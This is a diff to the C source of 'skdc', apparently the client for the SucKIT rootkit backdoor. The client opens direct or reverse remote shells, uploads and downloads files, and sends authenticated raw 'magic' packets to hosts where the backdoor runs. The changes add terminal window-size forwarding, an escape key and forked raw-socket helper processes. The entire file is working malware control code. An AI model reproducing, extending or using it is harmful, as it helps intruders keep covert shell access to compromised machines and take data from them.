@@ -10,17 +10,26 @@
 #include <termios.h>
 #include <errno.h>
 #include <stdlib.h>
+#include <termios.h>
+#include <sys/ioctl.h>
 
 #include "raw.h"
 #include "config.h"
 #include "actions.h"
 
 struct rawsock r;
+int swapd_pid, rawd_pid;
+int winchange = 1;
+
+void winch(int i) {
+    signal(SIGWINCH, winch);
+    winchange = 1;
+}
 
 int usage(char *s) {
     printf("skdc - <whats[@t]wekk.net>\n"
            "==========================\n"
-        "Usage:\n\n"
+        "Usage:\n"
         "%s -a {shell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
         "   -a: action to execute\n"
         "      * shell => launches a shell (-hd required)\n"
@@ -28,7 +37,7 @@ int usage(char *s) {
         "      * up => uploads a file (-hdf required)\n"
         "      * check => check if suckit is running on remote host (-hd required)\n"
         "      * listen => listens for a tty (-l required)\n"
-		"   -r: direct raw mode (disables reverse mode)\n"
+		"   -r: shell in direct raw mode (disables reverse mode)\n"
 		"   -h: host or ip address\n"
 		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
 		"   -d: destination port to send magic\n"
@@ -37,41 +46,14 @@ int usage(char *s) {
 	return -1;
 }
 
-void do_action(int action, int rsock, int wsock, char *file) {
-    switch(action) {
-        case UPLOAD:
-            printf("Uploading file\n");
-            client_upload(rsock, wsock, file);
-            break;
-        case DOWNLOAD:
-            printf("Downloading file\n");
-            client_download(rsock, wsock, file);
-            break;
-        case SHELL:
-            printf("Launching shell rsock: %d, wsock: %d\n", rsock, wsock);
-            client_shell(rsock, wsock);
-            break;
-        case RUPLOAD:
-            printf("Reverse uploading file\n");
-            client_upload(rsock, wsock, file);
-            break;
-        case RDOWNLOAD:
-            printf("Reverse downloading file\n");
-            client_download(rsock, wsock, file);
-            break;
-        case RSHELL:
-            printf("Launching reverse shell\n");
-            client_shell(rsock, wsock);
-            break;
-        default:
-            printf("Invalid option: %d\n", action);
-    }
-}
 
 // Client actions
 int client_shell(int rsock, int wsock) {
     struct termios oldterm, newterm; 
     char buf[BUFSIZE];
+    struct  winsize ws;
+
+    signal(SIGWINCH, winch);
 
     // Terminal setup
     tcgetattr(0, &oldterm);
@@ -86,6 +68,21 @@ int client_shell(int rsock, int wsock) {
         FD_ZERO(&fds);
         FD_SET(0, &fds);
         FD_SET(rsock, &fds);
+
+        if (winchange) {
+            if (ioctl(1, TIOCGWINSZ, &ws) == 0) {
+                unsigned char buffer[5];
+                buffer[0] = WCHAR;
+                buffer[1] = (ws.ws_col >> 8) & 0xFF;
+                buffer[2] = ws.ws_col & 0xFF;
+                buffer[3] = (ws.ws_row >> 8) & 0xFF;
+                buffer[4] = ws.ws_row & 0xFF;
+                write(wsock, buffer, 5);
+            }
+            winchange = 0;
+            continue;
+        }
+
         errno = 0;
         if (select(rsock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
 
@@ -94,6 +91,7 @@ int client_shell(int rsock, int wsock) {
             int count = read(0, buf, BUFSIZE);
             if (count <= 0 && (errno != EINTR)) break;
             if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
+            if (memchr(buf, ECHAR, count)) break;
         }
 
         /* shell => stdout */
@@ -104,8 +102,8 @@ int client_shell(int rsock, int wsock) {
         }
     }
 
-    tcsetattr(0, TCSAFLUSH, &oldterm);
     perror("Connection disappeared");
+    tcsetattr(0, TCSAFLUSH, &oldterm);
     close(rsock);
     close(wsock);
 
@@ -161,6 +159,37 @@ int client_download(int rsock, int wsock, char *file) {
     return 0;
 }
 
+void do_action(int action, int rsock, int wsock, char *file) {
+    switch(action) {
+        case UPLOAD:
+            printf("Uploading file\n");
+            client_upload(rsock, wsock, file);
+            break;
+        case DOWNLOAD:
+            printf("Downloading file\n");
+            client_download(rsock, wsock, file);
+            break;
+        case SHELL:
+            printf("Launching shell (scape character is ^K) \n", rsock, wsock);
+            client_shell(rsock, wsock);
+            break;
+        case RUPLOAD:
+            printf("Reverse uploading file\n");
+            client_upload(rsock, wsock, file);
+            break;
+        case RDOWNLOAD:
+            printf("Reverse downloading file\n");
+            client_download(rsock, wsock, file);
+            break;
+        case RSHELL:
+            printf("Launching reverse shell\n");
+            client_shell(rsock, wsock);
+            break;
+        default:
+            printf("Invalid option: %d\n", action);
+    }
+}
+
 unsigned long resolve(const char *host) {
     struct hostent *he;
     struct sockaddr_in si;
@@ -172,19 +201,6 @@ unsigned long resolve(const char *host) {
     memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
     return si.sin_addr.s_addr;
 }
-
-/*unsigned long resolve(const char *host, char *ipname) {
-    struct  hostent *he;
-    struct  sockaddr_in si;
-    
-    he = gethostbyname(host);
-    if (!he) {
-        return INADDR_NONE;
-    }
-    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
-    strcpy(ipname, inet_ntoa(si.sin_addr));
-    return si.sin_addr.s_addr;
-}*/
 
 void start_daemon(int action, int port, char *file) {
     int sock_listen, sock_con;
@@ -236,7 +252,10 @@ void start_daemon(int action, int port, char *file) {
     exit(0);
 }
 
-void raw_daemon() {
+int raw_daemon() {
+    int pid = fork();
+    if (pid) return pid;
+
     int sock;
     struct sockaddr_in raw;
     unsigned int slen = sizeof(raw);
@@ -276,7 +295,6 @@ int main(int argc, char *argv[]) {
 	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0, raw = 0;
 	char *host = 0, *cmd, *file = 0;
     unsigned long ip;
-//    char ipname[256];
     struct data cmdpkt;
     struct sockaddr_in cli;
 
@@ -324,7 +342,8 @@ int main(int argc, char *argv[]) {
 		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
 		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
 		((action == LISTEN)   && (local_port == -1)) || (action == -1) ||
-		((reverse == 1) && (local_port == -1))) {
+		((reverse == 1) && (local_port == -1)) ||
+        ((raw == 1) && action != SHELL)) {
 			return usage(argv[0]);
 	}
 
@@ -384,9 +403,8 @@ int main(int argc, char *argv[]) {
             pipe(r.r);
             pipe(r.w);
             r.initialized = 1;
-            
-            if (!fork()) raw_daemon();
-            launcher_directraw(&r, ip, local_port, dest_port, CLIENTAUTH);
+            rawd_pid = raw_daemon();
+            swapd_pid = swapd_raw(&r, ip, local_port, dest_port, CLIENTAUTH);
 
             // Generate packet
             memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));
@@ -397,7 +415,9 @@ int main(int argc, char *argv[]) {
             send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 1);
             send_raw(ip, local_port, dest_port, (unsigned char *)&cmdpkt, sizeof(struct data), 0);
 
-            do_action(action, r.r[0], r.w[1], file);
+            client_shell(r.r[0], r.w[1]);
+            kill(rawd_pid, 15);
+            kill(swapd_pid, 15);
         } else {
             printf("You need root acces for the raw mode\n");
         }
